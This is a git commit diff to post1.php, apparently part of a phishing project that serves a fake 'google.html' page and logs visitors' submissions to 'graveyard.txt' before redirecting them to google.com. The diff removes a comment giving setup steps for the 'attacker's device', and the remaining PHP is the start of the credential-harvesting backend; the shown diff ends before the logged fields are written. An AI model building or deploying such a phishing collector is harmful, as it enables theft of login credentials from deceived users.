757e521c2bf104f2880cd034801a3e104d7cbc65
Jake Enea <91490989+jakeenea51@users.noreply.github.com>
2022-08-14 10:58:56 -0400

    Update post1.php

--- post1.php
+++ post1.php
@@ -1,15 +1,4 @@
 <?php
-
-/*
-    - start the server.bat file
-    - to access, in browser type this into search bar --> <IP ADDRESS>:8080/google.html
-    - works on chrome, edge, and firefox
-    - works on safari on iPhone
-    - must have network connected to set as a private network and have file and printer sharing turned on 
-    over private networks in the network and sharing center settings (this only applies to the attackers device)
-    - also have to allow php to communicate over private networks (again, only on attacker's device)
-*/
-
 header("Location: https://www.google.com");
 $file = fopen("graveyard.txt", "a");
 fwrite($file, "--------------------\n");
